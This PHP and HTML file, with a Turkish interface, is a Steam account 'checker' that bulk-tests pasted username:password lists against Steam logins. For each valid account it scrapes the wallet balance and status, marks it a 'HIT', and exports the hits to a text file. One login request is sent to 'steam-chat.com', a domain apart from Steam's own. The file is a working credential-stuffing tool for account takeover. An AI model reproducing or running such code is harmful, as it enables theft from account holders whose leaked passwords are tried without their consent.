<?php
session_start();

if (isset($_GET['action']) && $_GET['action'] == 'check') {
    header('Content-Type: application/json');
    
    $user = $_POST['user'] ?? '';
    $pass = $_POST['pass'] ?? '';

    function hexToDec($hex) {
        $dec = 0; $len = strlen($hex);
        for ($i = 1; $i <= $len; $i++) {
            $dec = bcadd($dec, bcmul(strval(hexdec($hex[$i - 1])), bcpow('16', strval($len - $i))));
        }
        return $dec;
    }

    function steam_rsa_encrypt($password, $modHex, $expHex) {
        $modBin = hex2bin($modHex);
        $padLen = strlen($modBin) - strlen($password) - 3;
        $data = "\x00\x02";
        for ($i = 0; $i < $padLen; $i++) { $data .= chr(mt_rand(1, 255)); }
        $data .= "\x00" . $password;
        $m = hexToDec(bin2hex($data));
        $e = hexToDec($expHex);
        $n = hexToDec($modHex);
        $encryptedDec = bcpowmod($m, $e, $n);
        $resHex = ""; $quotient = $encryptedDec;
        while (bccomp($quotient, '0') > 0) {
            $remainder = bcmod($quotient, '16');
            $resHex = dechex(intval($remainder)) . $resHex;
            $quotient = bcdiv($quotient, '16', 0);
        }
        if (strlen($resHex) % 2 != 0) $resHex = '0' . $resHex;
        return base64_encode(hex2bin($resHex));
    }

    $us_clean = preg_replace('/@.*/', '', $user);
    $cookie_file = tempnam(sys_get_temp_dir(), 'steam_');
    
    // 1. ADIM: RSA Key Al
    $ch = curl_init("https://steamcommunity.com/login/getrsakey/");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "donotcache=".time()."&username=".$us_clean);
    curl_setopt($ch, CURLOPT_USERAGENT, 'okhttp/4.9.2');
    $rsaRes = json_decode(curl_exec($ch), true);

    if ($rsaRes && isset($rsaRes['publickey_mod'])) {
        // 2. ADIM: Şifreleme
        $encPass = steam_rsa_encrypt($pass, $rsaRes['publickey_mod'], $rsaRes['publickey_exp']);
        
        // 3. ADIM: Login
        $loginData = [
            'donotcache' => time(),
            'password' => $encPass,
            'username' => $user,
            'rsatimestamp' => $rsaRes['timestamp'],
            'remember_login' => 'false',
            'oauth_client_id' => 'C1F110D6',
            'mobile_chat_client' => 'true'
        ];

        curl_setopt($ch, CURLOPT_URL, "https://steam-chat.com/login/dologin/");
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($loginData));
        $loginResponse = curl_exec($ch);
        $resObj = json_decode($loginResponse, true);

        if (isset($resObj['success']) && $resObj['success'] == true) {
            
            // --- KRİTİK GÜNCELLEME: Çerezleri ve Session'ı Tazele ---
            // Önce ana sayfaya git ki sessionid oluşsun
            curl_setopt($ch, CURLOPT_URL, "https://store.steampowered.com/");
            curl_setopt($ch, CURLOPT_POST, false);
            curl_setopt($ch, CURLOPT_HTTPGET, true);
            curl_exec($ch);

            // 4. ADIM: CAPTURE (Bakiye Çekme)
            curl_setopt($ch, CURLOPT_URL, "https://store.steampowered.com/account/");
            curl_setopt($ch, CURLOPT_REFERER, "https://store.steampowered.com/");
            $source = curl_exec($ch);

            // Bakiye Yakalama (Geliştirilmiş Regex)
            $balance_cap = '0.00 TL';
            if (preg_match('/accountData price">([^<]+)<\/div>/', $source, $m)) {
                $balance_cap = trim($m[1]);
            } elseif (preg_match('/class="account_balance">([^<]+)<\/span>/', $source, $m)) {
                $balance_cap = trim($m[1]);
            }

            // Durum Yakalama
            preg_match('/account_manage_label">Status:.*?class="account_manage_link">(.*?)<\/a>/s', $source, $mStatus);
            $status_cap = isset($mStatus[1]) ? trim(strip_tags($mStatus[1])) : 'Normal';

            echo json_encode([
                'status' => 'success',
                'user' => $user, 'pass' => $pass,
                'name' => $resObj['push_id'] ?? 'User',
                'email' => '✔', 'google' => '✖', 'facebook' => '✖',
                'city' => 'Steam Global',
                'budget' => $balance_cap,
                'rank' => $status_cap,
                'skill' => 'HIT'
            ]);
        } elseif (isset($resObj['requires_twofactor']) && $resObj['requires_twofactor'] == true) {
            echo json_encode(['status' => 'success', 'user' => $user, 'pass' => $pass, 'rank' => '2Factor', 'skill' => '2FA', 'budget' => '???', 'city' => 'GUARD ON', 'email' => '✔']);
        } else {
            echo json_encode(['status' => 'fail', 'user' => $user]);
        }
    } else {
        echo json_encode(['status' => 'fail', 'user' => $user]);
    }
    @unlink($cookie_file);
    curl_close($ch);
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>STEAM LIVE PRO CHECKER</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #06090f; --card: #0d1117; --primary: #2f81f7; --success: #2ea043; --danger: #f85149; --border: #30363d; --text: #f0f6fc; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); padding: 20px; margin: 0; }
        .container { max-width: 1400px; margin: 0 auto; }
        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 15px 0; border-bottom: 1px solid var(--border); margin-bottom: 20px; }
        .header-stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 20px; }
        .stat-card { background: var(--card); border: 1px solid var(--border); padding: 15px; border-radius: 12px; text-align: center; }
        .stat-card b { display: block; font-size: 24px; margin-top: 5px; }
        .main-grid { display: grid; grid-template-columns: 1fr 2.5fr; gap: 20px; }
        textarea { width: 100%; height: 250px; background: #161b22; border: 1px solid var(--border); border-radius: 10px; color: #58a6ff; padding: 10px; font-family: monospace; outline: none; margin-bottom: 10px; resize: none; }
        .scroll-box { height: 500px; overflow-y: auto; background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 15px; padding: 15px; }
        .hit-item { background: var(--card); border: 1px solid var(--success); border-radius: 10px; padding: 15px; margin-bottom: 10px; position: relative; }
        .log-line { font-size: 11px; padding: 5px; border-bottom: 1px solid #21262d; display: flex; justify-content: space-between; }
        .btn { width: 100%; padding: 15px; background: var(--primary); color: white; border: none; border-radius: 12px; font-weight: 800; cursor: pointer; margin-bottom: 10px; transition: 0.3s; text-decoration: none; display: inline-block; text-align: center; }
        .btn-outline { background: transparent; border: 1px solid var(--border); width: auto; padding: 10px 20px; }
        .btn-outline:hover { background: var(--border); }
        .tag { font-size: 10px; padding: 2px 5px; border-radius: 4px; background: #21262d; color: var(--text); }
        @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="container">
    <nav class="navbar">
        <div class="logo">
            <i class="fab fa-steam" style="color:var(--primary); font-size: 24px;"></i>
            <span style="font-weight:800; margin-left: 8px;">STEAM <span style="color:var(--primary)">LIVE</span> PRO</span>
        </div>
        <a href="index.php" class="btn btn-outline">GERİ DÖN</a>
    </nav>

    <div class="header-stats">
        <div class="stat-card" style="border-top: 4px solid var(--primary);">KALAN <b id="s_total">0</b></div>
        <div class="stat-card" style="border-top: 4px solid var(--success);">HIT <b id="s_hit">0</b></div>
        <div class="stat-card" style="border-top: 4px solid var(--danger);">FAIL <b id="s_fail">0</b></div>
    </div>

    <div class="main-grid">
        <div class="side-panel">
            <textarea id="accs" placeholder="user:pass"></textarea>
            <button id="actionBtn" onclick="toggleProcess()" class="btn">TARAMAYI BAŞLAT</button>
            <div class="scroll-box" id="fullLog" style="height: 300px;"></div>
        </div>

        <div class="hit-panel">
            <button onclick="downloadHits()" id="dlBtn" class="btn btn-success" style="display:none; width: 100%; padding: 10px; background: var(--success); color: white; border: none; border-radius: 10px; margin-bottom: 10px; cursor: pointer;">HİT LİSTESİNİ İNDİR</button>
            <div class="scroll-box" id="hitLog" style="height: 610px;"></div>
        </div>
    </div>
</div>

<script>
let hitList = [];
let isRunning = false;

function downloadHits() {
    let content = hitList.map(h => `${h.user}:${h.pass} | Bakiye: ${h.budget} | Durum: ${h.rank}`).join('\n');
    const blob = new Blob([content], { type: 'text/plain' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = 'Steam_Hits.txt'; a.click();
}

function renderHits() {
    const hitsBox = document.getElementById('hitLog');
    hitsBox.innerHTML = '';
    hitList.forEach(res => {
        hitsBox.innerHTML += `
        <div class="hit-item" style="animation: slideIn 0.3s ease;">
            <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
                <b style="color:var(--primary)">${res.user}:${res.pass}</b>
                <span class="tag">${res.city}</span>
            </div>
            <div style="display:grid; grid-template-columns: repeat(4, 1fr); gap:10px; font-size:11px;">
                <div><small style="display:block; color:#8b949e">DURUM</small><b>${res.rank}</b></div>
                <div><small style="display:block; color:#8b949e">BAKİYE</small><b style="color:var(--success)">${res.budget}</b></div>
                <div><small style="display:block; color:#8b949e">SKILL</small><b style="color:orange">${res.skill}</b></div>
                <div><small style="display:block; color:#8b949e">GUARD</small><b>${res.email}</b></div>
            </div>
        </div>`;
    });
}

function toggleProcess() {
    if (isRunning) { isRunning = false; document.getElementById('actionBtn').innerText = "TARAMAYI BAŞLAT"; } 
    else { process(); }
}

async function process() {
    const accs = document.getElementById('accs').value.split('\n').filter(l => l.includes(':'));
    if(!accs.length) return;
    isRunning = true;
    document.getElementById('actionBtn').innerText = "DURDUR";
    let hits = 0, fails = 0;
    for (let i = 0; i < accs.length; i++) {
        if (!isRunning) break;
        document.getElementById('s_total').innerText = accs.length - i;
        const [u, p] = accs[i].trim().split(':');
        const fd = new FormData(); fd.append('user', u); fd.append('pass', p);
        try {
            const response = await fetch('?action=check', { method: 'POST', body: fd });
            const res = await response.json();
            const log = document.getElementById('fullLog');
            if(res.status === 'success') {
                hits++; document.getElementById('s_hit').innerText = hits;
                document.getElementById('dlBtn').style.display = 'block';
                log.innerHTML = `<div class="log-line"><span style="color:var(--success)">[HIT] ${u}</span></div>` + log.innerHTML;
                hitList.push(res); renderHits();
            } else {
                fails++; document.getElementById('s_fail').innerText = fails;
                log.innerHTML = `<div class="log-line"><span style="color:var(--danger)">[FAIL] ${u}</span></div>` + log.innerHTML;
            }
        } catch (e) {}
    }
    isRunning = false;
    document.getElementById('actionBtn').innerText = "TARAMAYI BAŞLAT";
}
</script>
</body>
</html>